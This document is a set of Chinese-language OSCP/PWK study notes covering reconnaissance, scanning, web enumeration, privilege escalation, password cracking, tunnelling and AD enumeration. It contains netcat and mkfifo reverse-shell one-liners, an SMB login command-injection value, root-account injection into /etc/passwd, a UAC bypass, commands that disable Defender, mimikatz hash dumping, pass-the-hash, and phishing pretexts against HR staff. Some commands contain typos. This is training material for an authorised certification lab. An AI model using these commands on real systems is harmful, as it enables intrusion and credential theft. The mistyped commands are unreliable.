# OSCP
## PWK- Penetration Testing with Kali Linux
```
教材课后题目一定要做
攻击实验环境靶机(30台以上)
练习渗透测试报告的编写
考试不限于教材内容

Try Harder!
- 重复练习, 确保自己熟练掌握知识点
- 尝试独立完成实验环境的靶机
- 遇到问题, 尽力搜索/阅读资料(补足短板)
- 适时求助, 根据方向性的提醒, 独立完成实验机
- 做好笔记, 积累经验, 总结思路.
```

# 关于考试
```
考试时长: 23小时45分钟(24个小时, 15分钟提前考试准备)
成绩达到70分可通过考试
建议准备英文身份证明材料
考试开始前15分钟到场, 以进行身份验证和其他考前任务
考试包包含VPN连接包/控制面板地址/, 每个目标机器的具体说明都在考试控制面板当中
考试之前阅读: https://www.offensive-security.com/faq/#exam-poc
考试结束之后, 24小时之内提交报告. 评分依据报告内容和质量, 因此应可能详细, 确保攻击过程可重复. 评分是手动过程, 需要等待官方通知.
10个工作日内得到成绩, 成绩合格确认证书邮寄地址.
refer: https://support.offensive-security.com/oscp-exam-guide/
```

# 考试环境
```
包含多漏洞主机的网络环境
目前考试包括3台非域控环境靶机 + 3台在AD的主机环境
非域控突破边界和提权各得十分
  缓冲区溢出漏洞仅出现在获得低权限环节
域环境三台靶机必须完全控制才能获得40分
  部分控制完全不得分
考试禁止使用SQLMap等自动化工具
只能针对指定的一台靶机使用MSF漏洞利用模块
考试内容全部涵盖与教材范畴, 但绝对不限于教材内容
考试期间应独处, 禁止登录社交/邮件等软件, 禁止接触考试电脑外的一切电子产品
```


# Linux文件系统
/bin  -> 普通程序
/sbin -> 系统程序
/etc  -> 配置文件
/tmp  -> 临时文件
/usr/bin -> 应用程序
/usr/share -> 数据文件和应用程序支持文件

# Linux命令
```
cat /etc/passwd | cut -d ":" -f 1,7 | grep sh | grep -v nologin
        cut: 切片 查看第一部分前面7行当中带有sh, 但是排除nologin的行
cat access.log | cut -d " " -f 1 | sort | uniq -c | sort -run
查看第一部分的""的所有信息

cat access.log | grep {IP_ADDRESS} | cut -d '""' -f 2 | sort -u 
查看某个ip地址的访问路径并按序答应
```
# 文本编辑器
## nano
```
Ctrl + O -> 写入修改
     + K -> 剪切当前行
     + U -> 粘贴
     + W -> 搜索
     + X -> 退出
     + T -> 执行命令
     + C -> 位置(行号)
     ...
```
# 文本比较
comm
---
```
comm filename1 filename2
comm -12 相同的
comm -3  不同的
```

diff
---
```
diff -c filename1 filename2
分别列出来
diff -u filename1 filename2
一起列出来
```

vimdiff
---
```
vimdiff filename1 filename2
```
以字符界面列出来

# 重点工具
```
Netcat
Socat
PowerShell
Wireshark
Tcpdump
```

## 监听流量
```
server nc -nvlp IP_ADDRESS port
client nc -nv IP_ADDRESS port
```

## 反弹shell
```
client nc -nvlp 4444 -e /bash/bin
server nc -nvlp 127.0.0.1 4444
```

## 内网穿透
```
1. nc -nvlp 5555 -e bash
2. nc -nvp 3333 -L 127.0.0.1:4444
3. nc -nvp 4444 -L 127.0.0.1:5555
4. nv -nv 127.0.0.1:3333
```
# PowerShell
$PSVersiontable


# 被动信息收集
```
也称开源情报 OSINT
在不与目标系统交互的情况下, 利用开放信息渠道搜索目标系统信息
是一个循环非线性的过程, 下一步如何攻击, 由前一步收集到的信息决定
信息收集途径, 渠道(第三方信息)
在渗透测试过程中并非一定必须
终极目标是了解目标系统, 扩大发现面
利用漏洞/社工/密码破解
```

- 初期发现的一切信息做好笔记
- WEB侦查, WEB站点会泄露大量的信息, 并长期观察疏于维护的系统
- 发现媒体账号, 员工邮箱, Twitter账号

Whois信息枚举
  - 基于TCP服务, 可以查询域名, 域名服务器, 注册者等公开信息
  - kali@kali: $whois domain.com
  - 关注Register name, Admin name, Tech Name, Name Server, 电话邮件, 地址等

反查IP地址(地址所有者)
  - whois [IP_ADDRESS]

# 主动信息收集
- DNS枚举
  域名解析
  host domain.com
  host -t mx domain.com 查询mx记录
  host -t txt domain.com 查询txt记录
  host idontexist.domain.com 爆破域名

  

  DNS正向查询
  sh script
  ```
  for hostname in $(cat file.txt); do host $hostname.domain.com; done
  ```

  字典文件
  apt install seclists

  DNS逆向查询突破
  ```
  for ip in $(seq 50 100);do host xxx.xxx.xxx.$ip ;done; grep -v "not found"
  ```



# 端口扫描
- TCP扫描
  nc -nvv -w 1 -z IP PORT-PORT

- UDP扫描
  是无状态尽力传输的协议, 没有三次握手机制, 使用针对协议的UDP扫描提高准确度
  发送UDP空包, 端口开放服务器无响应, 端口关闭返回ICMP端口不可达
  此机制扫描结果不完全准确, 有很多攻击向量
  nc -nvv -w 1 -z -u IP PORT-PORT

- nmap
  很多扫描选项需要访问raw rocket, 因此需要sudo打到最大效果.
  ```  
  统计扫描流量:
  iptables -I INPUT 1 -s IP -j ACCEPT
  iptables -I OUTPUT 1 -s IP -j ACCEPT
  iptables -Z
  nmap IP
  iptables -vn -L
  iptables -Z
  nmap -p IP
  iptables -vn -L
  ```
## 扫描技术
- SYN扫描
  NMAP默认使用, 不完成三次握手, 信息未到达应用层, 不产生应用层日志(网络层检测), 快速
  现代防火墙普遍具备半开连接的检测能力, 所谓的"隐蔽"扫描一点也不隐蔽, 反倒有误导
  sudo nmap -sS IP

- TCP全连接扫描 
  当用户没有Raw Socket权限的时候, 默认使用Berkeley socket API, 此时默认使用TCP全连接扫描
  因为要等待回包完成握手, 因此扫描速度慢, 但是挂socks代理扫描时, 必须用-sT
  ```nmap -sT IP```

- UDP扫描

  ```nmap -sU IP```

- Ping Sweeping
```
  -sn = ARP + ICMP + SYN443 + ACK80 + ICMP时间戳
  nmap -sn xxx.xxx.xxx.1-254
  nmap -v -sn xxx.xxx.xxx.1-254 -oG ping-sweep.txt
  grep Up ping-sweep.txt | cut -d " " -f 2
  ```
- sweep 指定端口(范围)
```
  nmap -p 80 xxx.xxx.xxx.1-254 -oG web-sweep.txt
  grep open web-sweep-txt | cur -d " " -f 2
  nmap -sT -A --top-ports=20 IP -oG top-port-sweep.txt
  端口TOP20来自/usr/share/nmap/nmap-serivces
  Service nmae: portnum/protocol, open-frequency, optional comments
```
nmap 主机发现
```
sudo nmap -sn ip/24
sudo nmap -p- ip --open
sudo nmap -pxx,xx,xx -sV ip
```

# SMB
扫描SMB/NETBIOS
```
sudo nmap -p139,445 -A IP
sudo nmap -v -p 139,445 -oG smb.txt xxx.xxx.xxx.1-254
sudo nmap -p139,445 --script script IP
```

NETBIOS枚举
```sudo nbtscan -r IP/24```
## Kali tool
smbclinet -L //ip
smbclient //ip/folder

```
login "/= `nc IP 4444 -e /bin/bash`"
nc -nvlp 4444
```

# NFS
运行在TCP111端口
重定向正确端口通常是默认TCP2049端口和服务

扫描rpcbind
```nmap -v -p 111 xxx.xxx.xxx.1-254```
脚本扫描
```nmap -p 111 -script nfs* IP```

## 扫描存活机器
```arp-scan -l```


# Web应用攻击
## Web枚举
### 识别目标系统技术栈
### 攻击载荷需要基于目标应用的技术栈基础来构建
  编程语言和框架
  WEB服务器软件
  数据库软件
  服务器操作系统
### 从浏览器可以收集很多信息开发工具
### 分析URL
  文件扩展名可用于发现目标系统开发语言PHP
  不同框架的文件扩展名差别巨大, 基于java的程序可能由jsp/do/html等.
  扩展名越来越不常见, 许多语言和框架都支持路由的概念, 允许程序员将URI映射到一段代码.
  利用路由的应用程序使用逻辑来确定用户返回什么内容, 令扩展名在很大程度上不再重要.
### 关注响应头
1. 截断代理(Burpsuite)
2. Header等
  Server头, 显示web服务器软件以及版本, 名称或者值通常显示服务端技术栈信息
  X- 开头的是非标准头, 经常泄露目标技术栈的额外信息
  X-amz-cf-id 表示经常使用AWS cloud
  X-powered-by (php.ini=>expose_php=off)
  X-Aspnet-Version

# WEB安全工具
## 路径枚举
dirb : 内建字典, 默认递归发现隐藏路径, 可结合cookie/定制头部
gobuster/dirbuster/dirsearch
dirb 
  -r 非递归爆破路径
  -z 10 每次请求增加10毫秒延时
Nikio
nikio -host=domain.com -maxtime=time/s

# 攻击Web漏洞
1. 绕过token
2. 文件包含
3. SQL注入



# Windows 缓冲区溢出

32位计算机: 2 * 32, 最多只能表示4G内存
64位计算机: 2 * 64, 最多能表示16EB的内存

2G给应用程序
2G给系统内核

堆栈: 存储的是线程/本地的临时数据
堆: 全局性的临时数据

1. 定位EIP具体位置
2. 测定坏字符 BadChar
3. JMP ESP所在内存当中的地址寻找出来. (mona)
4. 生成payload
# Linux 缓冲区溢出
## 被动信息收集
checksec --file=PATH 查看编译的时候是否使用了安全防御机制

关闭NX(DEP数据保护)
linux: noexec=off noexec32=offn ctrl+x


# 客户端攻击
## 客户端攻击, 攻击客户端软件漏洞 
例如浏览器 pdf office等软件
不需要与被攻击者直接路由可达
## 通过邮件附件或者恶意链接, 欺骗被害者访问
被害者一旦触发攻击代码, 主动建立反弹shell连接

## 信息收集
### 被动客户端信息
1. 发现目标公司出口IP
2. 建立站点, 诱骗目标公司员工访问, 通过IP/User-Agent发现目标员工OS/浏览器版本
3. 通过论坛和社交背题的图片分享会的相关信息(OS/APP/浏览器扩展/AVs)
4. 针对客户端软件版本定制攻击代码, 实现反弹shell
### 主动客户端信息
1. 与目标交互
2. 邮件/社交媒体/电话社工/获取OS/APPS/AVs/浏览器插件信息
### 社工与客户端攻击
1. 想HR发送无法打开的简历, 如HR要求重发简历, 询问其使用的office/os/AV软件版本
2. 声称建立使用了高级宏特性, 让建立更加美观/易于查看, 要求HR允许执行宏(宏恶意代码)

### 客户端指纹信息
1. 浏览器是首选的攻击目标
2. 建立站点获取OS/浏览器版本信息
3. 使用js收集客户端信息
使用fingerpringjs2

### 利用office攻击




# 搜索已知exp
## Website
>https://www.exploit-db.com/
https://www.securityfocus.com
https://packetstormsecurity.com

## 离线搜索
```
sudo apt update && sudo apt install exploitdb
ls -l /usr/share/exploited/
>exploits shellcodes
```

searchsploit EXPLOIT_NAME
/usr/sahre/exploitdb

### nmap
/usr/sahre/nmap/scripts

### beff
sudo beef-xss
username: beef
password: beef

### metasploit
```msfconsole -q```

### Test
```
sudo nmap ip -p- -sV -vv --open --reason
searchsploit james
```


# 修复EXP代码


# 文件传输
## 后渗透测试阶段
```
突破边界并在目标主机上获得初始低权限账号
任务:
提权
扩大控制
横向移动
安装后门
清理攻击痕迹
上传工具文件
```

## 升级非交互shell
```
python -c 'import pty;pth.spawn("/bin/bash")'
```

## 非交互式FTP下载
```
Windows:
echo open XXX.XXX.XXX.XXX 21 > ftp.txt
echo USER username >> ftp.txt
echo password >> ftp.txt
echo bin >> ftp.txt
echo get nc.exe >> ftp.txt
echo bye >> ftp.txt
```

``` ftp -v -n -s:ftp.txt```

# 规避防病毒软件
AV躲避技术分为两个大类:
  磁盘中(修改存储在硬盘当中的文件)
  内存中(现代恶意软件主要使用方法)

## 磁盘中的躲避技术(修改/混淆磁盘中的文件)
  打包: 打包后的文件体积更小/特征码不同/单一使用此方法并不足以规避目前主流AV软件的查杀
  混淆: 最初用于开发者保护自己的知识产权. 花指令 重组 变异代码 语义等价替代 分隔和重排序函数, 增加逆向分析的难度, 对基于特征码的检测方法比较有效
  加密Crypters: 加密软件, 增加解密存根, 执行时在内存中解密执行代码, 磁盘当中只有加密的文件. 更改了可执行代码, 作为最有效的反病毒规避技术之一, 加密已经成为了现代恶意软件的基础.
  软件保护: 结合以上方法, 同时增加反逆向/反调试/虚拟机检测等技术. 即用于软件保护, 也可以用于AV规避, 用于相关技术太复杂, 目前并没有开源的AV规避产品, 商业工具: The Enigma Protector
## 内存中躲避技术
  内存中注入也在PE Injection, 是目前主流的AV躲避技术
  有点是不向硬盘当中写文件(AV软件重点关注)
  需要独立编写代码实现内存注入
  远程进程内存注入技术
    利用Windows API, 向正常PE进程注入攻击代码
    首先通过OpenProcess函数获得可用的目标进程HANDLE(有权访问的)

  反射DLL注入技术
  进程挖空技术(Process Hollowing)
  内连挂载技术(Inline Hooking)

# 本地提权
突破边界后通常获得低权限账号, 为获得目标系统全面控制能力需要进行提权
## 常见提权思路
1. 服务配置错误
2. 文件或者服务权限漏洞
3. 内核漏洞
4. 高权限运行的服务漏洞
5. 敏感信息漏洞
6. 总是在执行二进制文件之前提升特权的系统设置
7. 脚本中包含硬编码的凭证, 以及许多其他内容

## 信息收集
发现提权的可能途径, 包括手动以及自动信息收集的枚举技术
Windows:
> https://fuzzysecurity.com/tutorials/16.html

Linux:
> https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation

---
### 手动枚举
- 耗时但是能发现更多的提权途径
- 不同版本的系统及系统环境, 信息收集的方法有所不同, 并非每种提权方法都适用于所有系统
- 枚举用户账号(适用于Windows/Linux)
    - whoami
- Linux系统
    - id
    - w
    - whoami
- 查看Linux系统所有账号
```
cat /etc/passwd
```
- 识别主机名
  - hostname
- 枚举操作系统版本和架构
  - systeminfo
  - cat /etc/*-release
  - cat /etc/issue
  - uname -a
- 枚举进程/服务
    - Windows: tasklist /SVC
    - Linux: ps axu
- 枚举网络相关信息
  - ipconfig /all
  - route print
  - netstat -nao
  - netstat -pantulo
  - ip a
  - /sbin/route
  - ss -anp
  - ss -pantu
- 枚举防火墙状态以及规则
  - netsh advfirewall show currentprofile
  - netsh advfirewall show all
- 枚举调度任务
  - Windows: schtasks /query /fo LIST /v
  - Linux: ls -lah /etc/cron*
  - Linux: cat /etc/crontab
- 枚举安装软件和补丁
  - WMI无法发现未通过Windows Installer安装的程序
    - wmic product get name,version,vendor
  - Wmic可通过查询Win32_QuickFixEngineering(qfe)类, 列出系统范围的更新
    - wmic qfe get Caption,Description, HotFixID, InstalledOn
  - Linux 发行版不同, 使用的包管理器也不同
    - Debian-Based=> apt
    - Red Hat-Based=> rpm
  - Debian Linux列出已安装的软件包
    - dpkg -l
- 枚举可读写的文件额目录
  - 对特权账号执行的标本和程序拥有写权限时, 可对其修改, 注入提权代码
    - Windows系统使用AccessChk搜索
    - Linux可使用find命令
  - 攻击者可读取机密文件
  - 搜索Program Files目录当中Everyone组拥有写权限的文件或者目录, 如果这些文件以特权账号或者服务账号运行, 则可以用后门程序覆盖(PowerShell脚本)
    ```
    accesschk.exe -uws "Everyone" "C:\Program Files"
    ```
  - 使用PowerShell查找权限配置漏洞
    ``` 
    Get-ChildItem "C:\Program Files\" -Recurse | Get-ACK | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
    ```
  - Linux系统搜索权限漏洞
    find / -writable -type d 2 > /dev/null
  - 枚举未挂载的磁盘分区, 未挂载的分区中可能包含机密信息
    ```
    Windows: mountvol
    cat /etc/fstab
    mount
    ```
  - 枚举设备驱动和内核模块
    ```
    drvierquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', PATH
    ```
  - 查找驱动的数字签名(针对发现的驱动模块搜索已知漏洞)
    ```
    Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
    ```
  - Linux系统查看已加载的内核模块信息(针对发现的驱动版本搜索已知漏洞)
    ``` 
    lsmod
    /sbin/modinfo libata
    ```
  - 枚举自动提升权限的二进制文件
    - 在windows系统当中, 检查AlwaysInstallElevated注册表项, 在HKEY_CUEENT_USER或HKEY_LOCAL_MACHINE中AlwaysInstallElevated的值为1(enable), 则任何用户都将以特权账号运行windows安装包(MSI)
    ```
    reg add HKCU\Software\Policies\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1
    reg add HKLM\Software\Policies\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1
    reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
    
    msfvenom -p windows/adduser USER=admin PASS=Passw0rd -f msi -o au.msi
    msiexec /quiet /i
    ```
    - Linux系统当中搜索具有SUID权限的文件
      - 启用SUID的程序文件, 将以属主的权限运行, 如果文件属主为root, 则可用于提权
      ```
      find / -perm -u=s -type f 2>/dev/null
      ```
  - 自动枚举
    - 手动枚举耗时, 自动枚举工具可以提高效率
      - windows-privesc-check2.exe --dump -G
      - unix_privesc_check standard > output.txt
      - Linux: linPEAS
      - Windows: winPEAS

## 提权
### Windows
1. UAC绕过
- 允许管理员用户通过静默方式将完整性基本从中高提升到高, 绕过UAC
- 大多数UAC绕过技术都只针对特定版本(Win10 Build 1709)
- fodhelper用于修改操作系统的语言设置, 默认运行于高完整性级别, 无需管理员权限即可修改注册表项, 实现以高完整性级别运行程序
- 使用sigcheck查看fodhelper.exe的manifest
    ```
    sigcheck.exe -a -m c:\windows\system32\fodhelper.exe
    ```
- 使用Process Monitor检查该程序的执行过程
   ```
  1. 先启动procmon.exe, 再运行fodhelper.exe, 过滤筛选fodhelper.exe的执行操作
  2. 增加搜索reg关键字的过滤规则, 只显示fodhelper.exe的注册表相关操作
  3. 增加搜索NAME NOT FOUND报错消息过滤规则, 表示fodhelper在访问不存在的注册表项
  4. 我们无权修改任意注册表项, 因此过滤当前用户可读写的HKEY:\Software\Classes\ms-setting\shell\open\command键值不存在, 手动添加注册表键
  > REG ADD HKCU\Software\Classes\ms-setting\Shell\Open\command
  5. 重启fodhelper程序, 发现其进而寻找..\Shell\Open\Command\DelegateExecute
  6. 添加DelegateExecute为空值
  > REG ADD HKCU\Software\Classes\ms-setting\Shell\Open\Command\ /v DelegateExecute /t REG_SZ
  7. 将"NAME NOT FOUND"筛选项为"SUCCESS", 然后重启fodhelper.exe程序
  8. 由于 DelegateExecute 为空值, 程序访问默认值 Shell\open\command, 将其改为cmd
  > REG ADD HKCU\Software\Classes\ms-setting\Shell\Open\Command /d "cmd.exe" /f
  ```
2. 文件权限漏洞 
  - 以 System运行的服务程序, 若文件系统允许任何人修改, 则可用于提权
  - 查询所有服务进程路径(Program Files 路径表示是用户安装的服务)
  ```
  Get-WmiObject win32_service | Select-Object Name, State, PathName| Where-Object{$_.State -like 'Running'}
  ```
  - 编译源码文件add.user.c, 替换源程序文件

3. 服务路径未引号闭合
4. 内核漏洞

### Linux
1. 文件权限漏洞
  - Linux特权机制
    - 类Unix系统中的一切都是文件, 标准文件包括RWX
  - 寻找可以修改, 并以高权限执行的程序
  - Cron调度任务是重点关注目标
  - 系统级别的调度任务以root权限运行, 通常为管理员创建的脚本(权限不安全)
  - 查看日志发现系统调度任务 /var/log/cron.log
    ```
    grep "CRON" /var/log/cron.log
    ```
  - 脚本文件权限允许所有人修改
    ```
    ls -lah FILE_PATH
    修改脚本内容, 以root权限反弹shell
    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 |nc IP PORT > /tmp/f >> FILE"
    本地启动监听
    nc -lnvp PORT
    ```
2. /etc/passwd权限漏洞
 - 除非使用集中式身份认证(AD/LDAP), 通常linux系统账号的密码存放于/etc/shadow
   - 默认普通用户不可读
 - 账号信息存储于/etc/passwd当中(全局可读), 第二列可存放密码
   - 若该文件可修改, 那么则可以写入管理员账号实现提权
 - 生成密码
    ```
    openssl passwd [PASSWORD]
    ```
 - 添加账号
    ```
    echo "[PASSWORD_HASH]:0:0:root:/root/bin/bash" >> /etc/passwd
    ```

3. 内核漏洞
 - 查看系统发行版/内核/架构
   ```
   cat /etc/issue
   uname -r
   arch
   ```
 - 搜索内核利用程序
    ```
      searchsploit linux kernel SYSTEM VERSION
    ```
 - 编译代码
    ```
    gcc FILE -o FILE_NAME
    chmod +x FILE_NAME && ./FILE_NAME
    ```
## 密码攻击
- kali当中包含密码字典
- 专属密码字典
  - 通过添加特定目标组织的单词和短语来提高电磁列表的有效性
  - 向字典中添加特定企业的技术/产品名称/变形, 提高其有效性
  - 手动添加或使用cewl等工具生成专属字典
    ```
    cewl domain.com -m 6 -w wordlists.txt
    ```
- 密码字典
- 暴力破解
  - 所有字符组合的纯密码爆破无法实施
  - 按指定长度和字符组合规则来生成爆破密码字典
    ```
    根据指定字符长度和字符组合规则来生成爆破密码字典(1大写+2小写+2符号+3数字)
    crunch 8 8 -t ,@@^^%%%
    ```
  - 生成4-6个字节HEX字符密码爆破字典
    ```
    crunch 4 6 0123456789ABCDEF -o FILE_NAME
    ```
  - 指定字符集生成密码字典
    ```
    crunch 4 6 -f FILE_PATH -o OUTPUT_FILE_NAME
    ```
- 在线密码爆破
  - Medusa
    ```
    执行密码爆破
    medusa -h RHOST -u USERNAME -P DIRFILE -M http -m DIR:/PATH
    ```
  - Crowbar
    ```
    crowbar -b rdp -s IP/SUBMARK -u username -C PASSWORD_FILE -n 1
    ```
  - Hydra
    ```
    hydra IP http-form-post "path:user=username&pass=^PASS^:ERRORMEG" -l admin -P FILE_NAME -vV -f
    ```
- 哈希攻击
  - HASH类型
  >http://openwall.info/wifi/john/sample-hashes
  
  - Hashid识别工具
    ```
    hashid hash
    ```
  - Linux 密码哈希
    ```
    分析识别linux系统账号的密码架构
    ─$ sudo grep root /etc/shadow 
    root:$y$j9T$7L.9A92KAs/wAhLC0M/HO0$UchaZGDLe64ZrGAaCVUkTkHwXoayjqHxccOlyil2Km0:19167:0:99999:7:::
    $y: yescrypt
    $j9T$7L: 加盐(随机值)

    https://manpages.debian.org/unstable/libcrypt-dev/crypt.5.en.html
    https://www.slashroot.in/how-are-passwords-stored-linux-understanding-hashing-shadow-utils#:~:text=Shadow%20utils%20is%20a%20package,is%20only%20accessible%20by%20root.
    ```
  - Windows 密码哈希
    - Windows系统账号的密码存储于SAM文件当中
      - 为了防止离线密码破解, 从NT4.0 SP3开始引入SYSKEY加密SAM文件;
    - NT=> Windows 2003包含两种密码 HASH=>LM(DES)/NTLM(MD4)
    - LM: 密码被分割成7个字符每段, 每段字符都转换成大写字母, 然后分别计算HASH值
      - 不加盐, 字符集有限. 因此容易被爆破
    - NTLM: Vista开始放弃了LM, 使用NTLM, 不再分段
      - 支持所有Unicode字符(仍不加盐)
    - 由于Windows内核独占锁定SAM数据库, 因此运行过程当中无法拷贝SAM文件
      - mimikatz可以DUMP HASH
    - mimikatz可以提取本地安全机构子系统(LSASS)进程内存中缓存的密码哈希
    - 由于LSASS是一个以SYSTEM 用户运行的特权进程, 因此mimikatz 需要管理员权限才能提取其中的HASH
  - 使用 mimikatz 读取 Windows 密码哈希
    - privilege::debug
      - 启用SeDebugPrivilge权限, 可以修改其他进程. 如果执行失败, 说明非管理员权限.
    - token::elevate # 从高完整性级别提升为System 完整级权限
    - lasdump:sam
  - PtH攻击
    - Windows系统密码不加盐, 因此可以利用捕获的HASH直接进行身份验证
    - 利用一台计算机上获得的HASH去碰撞内网其他主机 => Pass the HASH
    - 通过SMB协议PtH执行系统命令(需要管理员权限访问C$管理共享)
    - PtH 执行cmd命令
      ```
      pth-winexe -U <username>%<LM>:<NTLM> //10.11.0.22 cmd
      ```
    - 认证过程当中, NTML被更改为NetNTLM(版本1/2)格式, 中间人可以抓取并重放HASH
    - IE和Defender使用(WPAD)检测代理设置, 内网可以使用Responder.py 创建流氓WPAD服务, 接受密码HASH值
  - Linux密码破解
    ```
    生成破解文件
    unshadow PASSWORD_FILE shadow_file > unshadow.txt
    john --rules --wordlists=WORDLIST_FILE unshadow.txt

    john 多节点密码破解(只支持CPU计算能力)
      --fork 8 # 多线程利用多核CPU的计算能力
      --node=1-8/16 # 将字典分割成16个部分. 节点1计算前面8个部分
      --fork=8 --node=9-19 # 节点2计算后八部分, 8核CPU各计算一部分
    ```
    - 攻击者可以预计算HASH值, 存储于数据库或者彩虹表当中, 破解时直接查询结果
    - HASHCAT支持CPU+GPT计算, 支持算法识别和字典变形处理
  - 离线密码
    - 加盐的HASH难于破解, 但几乎可以同时获得 密码 和 盐
      - 例如从数据库/配置文件中获得(唯一盐加密所有密码)
    - 破解windows密码
      - sudo john hashfile --format=NT
      - john --wordlists=rockyou.txt hashfile --format=NT
      - john --rules --wordlists=rockyou.txt --format=NT
    
## 隧道与端口转发
- 企业内网系统通常不对外开放
- 利用突破边界
- 内网穿透
  - 端口转发
  - 隧道: 将一种协议封装于另一种协议之中, 在不兼容/不受信的网络中实现安全通信
  - 流量封装, 在严格受限的网络环境下打通内网
### 端口转发
- 重定向到一个IP: 端口的流量到另一个IP:端口
  - RINETD
  ```
  所有WEB服务器80端口的请求重定向到xxx.xxx.xxx.xxx
  sudo apt install rinted
  vim /etc/rinted.conf
  0.0.0.0 80 xxx.xxx.xxx.xxx 80

  sudo service rinted restart
  ```
### SSH隧道
- SSH本地端口转发
    ```
    被控主机: 192.168.1.10
    内网主机: 10.0.0.10
    sudo ssh -N -L 0.0.0.0:445:10.0.0.10:445 username@192.168.1.10

    由于Windows 2016默认不再支持SMBv1, 在建立隧道之前需要修改kali本地Samba的服务配置

    vim /etc/samba/smb.conf
    ...
    min protocol = SMB2

    sudo /etc/init.d/smbd restart
    smbclient -L 127.0.0.1 -U Administrator
    ```
- Recon-ng
  - 建立远程端口转发隧道, 重定向访问目标MySQL服务, 监听端口2221
  ```
  example:
  local: 10.86.10.1
  mysql: 被控主机本地监听
  ssh -N -R 10.86.10.1:2221:127.0.0.1:3306 kali@10.86.10.1
  ss -antp | grep "2221"
  sudo nmap -sS -sV 127.0.0.1 -p 2221
  ```
### 动态端口转发
  - proxychains
  ```
  被控主机: 10.86.10.2
  内网网段: 192.168.1.0/24
  sudo ssh -N -D 127.0.0.1:8080 user@10.86.10.2
  配置proxychains:
    /etc/proxychains.conf
    sock4/5 127.0.0.1 8080
  挂代理扫描内网主机端口
    sudo proxychains nmap --top-ports=20 -sT -Pn 192.168.1.110
  ```
  - plink
    - 基于Windows系统SSH隧道/端口转发
    ```
    kali: 10.86.10.1
    监听端口:1234

    Windows:
    建立反向端口转发, 使kali可以访问被控机本地的MySQL服务
    plink.exe -ssh -l kali -pw ilak -R 10.86.10.1:1234:127.0.0.1:3306 10.86.101
    密码倒置kali=> ilak
    当未获得交互shell时, 无法确认ssh密钥, 修正方式
    cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R 10.86.10.1:1234:127.0.0.1:3306 10.86.10.1

    扫描被控以及本地MySQL服务
    sudo nmap -sS -sV 127.0.0.1 1234
    ```
  - netsh
    ```
    端口转发
    netsh interface portproxy v4tov4 listenport=8080 listenaddress=LHOST connectport=80 listenaddress=RHOST
    验证转发端口已开启
    netstat -anp TCP | find "8080"
    ```
    修改防火墙规则, 开放8080端口
    ```
    netsh advfirewall add rule name="forward_port_rule" protocol=TCP dir=in locaip=LHOST localport=8080 action=allow
    ```
    访问内网8080端口SMB共享
    ```
    sudo vim /etc/samba/smb.conf
    min protocol=SMB2
    sudo /etc/init.d/smbd restart
    smbclient -L RHOST --port=4455 --user=Administrator
    ```
    挂载访问共享文件夹
    ```
    sudo mkdir /mnt/SHARE_NAME
    sudo mount -t cifs -o port=8080 //RHOST/folder -o username=Administrator,password=PASSWORD /mnt/SHARE_NAME
    cat /mnt/SHARE_NAME/FILE
    ```
  - HTTPTunnel
    - 深层包检测设备(FW/IPS/IDS)可能只允许指定的协议的流量通过, 例如HTTP/HTTPS
      - 进制SSH协议流量, 因此基于SSH协议的隧道将失败 
    - HTTPTunnel利用HTTP协议封装其他协议的流量
     - C/S架构,通信双方都需要安装
    - 安装httptunntel
     - sudo apt install httptunnel
    - 隧道: Kali:8080 -> Linux: 1234 -> Linux:8888 -> Windows:3389
      - 前一段是HTTP隧道, 内网部分则是SSH本地端口转发隧道
    ```
    在被控的Linux和Windows之间建立内网SSH本地端口转发通道
    ssh -L 0.0.0.0:8888:192.168.1.110:3389 user@127.0.0.1
    在被控主机上建立HTTP隧道服务端, 转发本机1234到8888端口
    hts --forward-port localhost:8888 1234
    在kali与被控主机之间建立HTTP隧道
    htc --forward-port 8080 10.86.10.1:1234
    直接RDP访问Windows
    Rdesktop 127.0.0.1:80
    ```




## 域
### 基本概念
- AD是一个非常复杂的细粒度的管理层, 它的攻击面非常大
- AD攻击方法主要是枚举/身份认证/横向纵向移动
- AD依赖DNS名称解析, DC几乎*总是*DNS服务器
  - 管理工具
    ```
    dsa.msc 活动目录管理
    dnsmgmt.msc DNS管理
    ```
### 枚举
 - AD渗透针对权限结构进行攻击, 而并非攻击系统漏洞
 - AD渗透起始于枚举
   - 基于已经控制的一台域内成员计算机
 - 域通常使用组账号简化权限管理, 枚举高权限组成员(Domain Admins)
 - 目标是为了获得高权限权限, 完全控制DC
   - DC包含域内所有账号HASH, 域管理员可管理域内所有主机.
 - 枚举AD用户/组
   - 假设已经获得了域账号登录域内主机(本地管理员)
 - 枚举域用户/组账号
   - 发现高权限组成员账号

### 传统枚举方法
  - 枚举本地账号
    - net user
  - 枚举域账号
    - net user /domain
  - 枚举域内所有组
    - net group /domain



### 现代枚举方法
  - PowerShell cmdlets Get-ADUser(默认只安装于DC上)
    - Win7以上的版本可安装(需要管理员权限执行)
  - 开发一个PS脚本, 用于枚举所有域用户以及属性
    - 查询域名-> PDC角色->账号->属性
    - PDC包含域内最新数据
  - 与用户通过LDAP协议, 利用DirectorySearcher .NET对象查询AD
    - 获得全部非特权账号信息
  - 查询路径的格式
    - LDAP://DC_HostName[:PortNumber][/DistinguishedName]
    - DistinguishedName: DN名
  - 查询当前已登录的账号
  - 从工作站到本地管理员, 提权到服务器管理员, 再提权到域管理员(连锁提权)
  - 首先枚举域中所有计算机, 然后用NewWkstaUserEnum查询所有计算机登录账号
    - 需要拥有目标主机本地管理员权限
  - 或者使用NetSessionEnum 查询服务器上的活动用户会话(普通域用户权限即可)

  
  - 禁用Defender
  ```
  REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
  gpupdate /force
  ```
  - 导入PowerView(来自PowerShell Empire) 调用函数查询登录账号/会话
    ```
    Import-Module .\PowerView.ps1
    Get-NetLoggedon 函数执行 NetWkstaUserEnum
    Get-NetSession 函数执行 NetSessionEnum
    ```
  - 查询客户端计算机当前账号
    ```
    Get-NetLoggedon -Computer client
    ```
